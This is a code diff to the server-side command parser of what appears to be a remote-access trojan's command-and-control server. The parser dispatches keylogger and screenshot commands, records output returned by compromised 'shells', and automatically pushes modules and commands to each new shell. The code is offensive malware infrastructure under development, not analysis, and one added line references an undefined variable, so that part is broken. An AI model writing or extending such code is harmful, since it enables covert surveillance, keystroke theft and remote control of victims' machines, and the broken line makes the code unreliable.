@@ -22,31 +22,35 @@ class HTTPDParser:
         self.cmds["userinput"] = self.keylogger
         self.cmds["screenshot"] = self.screenshot
         self.config = config
-        self.output = None
+        self.output = False
         self.db = self.config.get("redis")
         self.debug = False
         if self.config.get("debug-mode") == "on":
             self.debug = True
 
     def parse_cmd(self,guid,data,cmd_guid=None):
-        if self.debug:
-            UI.warn("parse_cmd got %s %s" % (guid,cmd_guid))
-            UI.warn(data)
         data = data.decode()
         cmd = data.split(" ", 1)[0].lower()
         
+        if self.debug:
+            UI.warn("parse_cmd got %s %s" % (guid,cmd_guid))
+            UI.warn(data)
+            
         if cmd in self.cmds:
             callback = self.cmds[cmd]
             callback(guid, data)
         else:
-            if cmd_guid == None:
-                self.hello(guid, data)
-            else:
                 # I assume we got command output here and save it
                 # The GUID does not matter it's just used to confirm we are receiving data
                 self.db.push_output(guid, data, cmd_guid)
                 Log.log_shell(guid, "Received", b64decode(data).decode())
                 self.db.append_shell_data(guid, "[%s] Received: \n%s\n" % (Utils.timestamp(), b64decode(data).decode()))
+                
+                self.hello(guid, data) # We are fetching need command to be run
+                
+        if self.debug:
+            UI.warn("parse_cmd returned %s" % guid)
+            UI.warn(self.output)                
         return self.output
 
     def register(self, guid, data):
@@ -69,8 +73,6 @@ class HTTPDParser:
         self.db.set_key("%s:keylogger" % guid, "")
         Log.log_event("New Shell", data)
         self.get_autocommands(guid)
-        if self.config.get("auto-interact") == "on":
-            pass
 
     def hello(self, guid, data):
         data = self.db.get_cmd(guid)
@@ -104,10 +106,11 @@ class HTTPDParser:
         profile = self.config.get("profile")
         commands = profile.get("autocommands")
         modules = profile.get("automodules")
-        print(guid)
+        
+        self.db.append_server_events("\n[%s] Running auto load modules on shell: %s" % (Utils.timestamp(), shell))
         if self.debug:
             UI.warn("Calling AutoLoading session: %s" % guid)
-        
+
         for module in modules:
             remote_command = Modules.gen_push_command(module)
             if self.debug:
@@ -116,8 +119,8 @@ class HTTPDParser:
             Log.log_shell(guid, "Autoloading module %s" % module)
             self.db.append_shell_data(guid, "[%s] AutoModule Sending: \n%s\n\n" % (Utils.timestamp(), remote_command))
             self.db.push_cmd(guid, remote_command, Utils.guid(), self.config.get("username"))
-
-        # Execution autocommand after modules autoload to make sure we have loaded module required
+        
+        # Execution autocommand after modules auto load to make sure we have loaded module required
         if self.debug:
             UI.warn("Calling AutoLoading session: %s" % guid) 
                    
